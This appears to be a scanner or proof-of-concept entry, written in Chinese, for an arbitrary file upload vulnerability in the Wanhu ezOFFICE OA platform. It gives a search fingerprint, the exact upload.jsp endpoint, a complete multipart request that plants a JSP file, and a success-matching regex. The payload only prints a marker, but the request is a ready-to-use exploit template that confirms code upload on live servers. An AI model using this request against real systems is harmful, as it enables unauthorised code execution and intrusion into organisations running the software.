# 万户OAupload任意文件上传漏洞

- **系统**：万户OAupload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=abc HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1e…`

**请求体 / payload**
```
--b0d829daa06c13d6b3e16b0ad21d1eed
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
<%out.print("dudesuite");%>
--b0d829daa06c13d6b3e16b0ad21d1eed--
```
- **预期**：200　|　^(?=.*?上传成功)(?=.*?jsp).*?$